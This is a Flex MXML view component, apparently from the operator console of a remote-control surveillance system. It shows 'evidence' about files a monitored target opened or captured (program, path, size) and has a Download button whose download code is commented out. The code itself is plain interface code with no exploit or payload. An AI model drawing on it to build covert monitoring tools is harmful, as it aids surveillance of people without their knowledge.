<?xml version="1.0" encoding="utf-8"?>
<s:BorderContainer xmlns:fx="http://ns.adobe.com/mxml/2009"
									 xmlns:s="library://ns.adobe.com/flex/spark"
									 xmlns:mx="library://ns.adobe.com/flex/mx"
									 height="100%"
									 width="100%"
									 borderColor="0xCCCCCC"
									 backgroundColor="0xCCCCCC"
									 backgroundAlpha="0.5">
	<fx:Script>
		<![CDATA[
			import flashx.textLayout.conversion.TextConverter;
      import it.ht.rcs.console.DB;
			import it.ht.rcs.console.evidence.controller.EvidenceManager;
			import it.ht.rcs.console.utils.Size;
      import flash.filesystem.File;

			private var _evidence:Object;

			[Bindable]
			private var size:String;

			[Bindable]
			public function set evidence(value:Object):void
			{
				_evidence=value;
				if (isNaN(evidence.data.size))
				{
					size="(unknown)"
				}
				else
				{
					size=Size.toHumanBytes(evidence.data.size)
				}
			}

			public function get evidence():Object
			{
				return _evidence; //program, path, size
			}

			private function lineBreak(s:String):String
			{
				var result:String=s.replace(new RegExp("\n", "g"), "<br>");
				return result;
			}
      
      private function getFile():void
      {
        var target:String=EvidenceManager.instance.evidenceFilter.target;
        var url:String=DB.hostAutocomplete(Console.currentSession.server) + "grid/" + evidence.data._grid + "?target_id=" + encodeURIComponent(target);
        
        var fileName:String = evidence.data._grid+encodeURIComponent(target)
        
        /* var request:URLRequest = new URLRequest(url);
        var stream:URLStream = new URLStream();
        var file:flash.filesystem.File = File.documentsDirectory.resolvePath(fileName);
        
        file.browseForSave("Download " + fileName);
        file.addEventListener(Event.SELECT, function(...args):void {
          if (file.extension != extension) {
            // fix for see FP-2014 in Adobe's JIRA: if the user has changed the
            // filename then the extension is null, so we create a new File
            // instance and append the original extension again so that
            // this is preserved
            file = new File(file.nativePath + "." + extension);
          }
          stream.addEventListener(Event.COMPLETE, function(evt:Event):void {
            var fileData:ByteArray = new ByteArray();
            stream.readBytes(fileData, 0, stream.bytesAvailable);
            var fileStream:FileStream = new FileStream();
            fileStream.open(file, FileMode.WRITE);
            fileStream.writeBytes(fileData, 0, fileData.length);
            fileStream.close();
          });
          // add other event listeners for PROGRESS, ERROR, and so on...
          stream.load(request);
        }); */
      }
		]]>
	</fx:Script>
	<s:layout>
		<s:VerticalLayout paddingBottom="10"
											paddingLeft="10"
											paddingRight="10"
											paddingTop="10"/>
	</s:layout>
	<s:RichText id="programTxt"
							width="100%"
							textFlow="{TextConverter.importToFlow('&lt;b&gt;Program: &lt;/b&gt;'+evidence.data.program, TextConverter.TEXT_FIELD_HTML_FORMAT)}"
							fontSize="15"
							visible="{evidence.data.type=='open'}"
							includeInLayout="{evidence.data.type=='open'}"/>
	<s:Line width="100%"
					visible="{evidence.data.type=='open'}"
					includeInLayout="{evidence.data.type=='open'}">
		<s:stroke>
			<s:SolidColorStroke color="0xCCCCCC"/>
		</s:stroke>
	</s:Line>
	<s:RichText id="pathTxt"
							width="100%"
							textFlow="{TextConverter.importToFlow('&lt;b&gt;Path: &lt;/b&gt;'+evidence.data.path, TextConverter.TEXT_FIELD_HTML_FORMAT)}"
							fontSize="15"/>
	<s:Line width="100%">
		<s:stroke>
			<s:SolidColorStroke color="0xCCCCCC"/>
		</s:stroke>
	</s:Line>
	<s:RichText id="sizeTxt"
							width="100%"
							textFlow="{TextConverter.importToFlow('&lt;b&gt;Size: &lt;/b&gt;'+size, TextConverter.TEXT_FIELD_HTML_FORMAT)}"
							fontSize="15"/>
  <s:Line width="100%">
    <s:stroke>
      <s:SolidColorStroke color="0xCCCCCC"/>
    </s:stroke>
  </s:Line>
  <s:Button id="downloadBtn" visible="{evidence.data.type=='capture'}"
            includeInLayout="{evidence.data.type=='capture'}" label="Download" click="getFile()"/>
</s:BorderContainer>
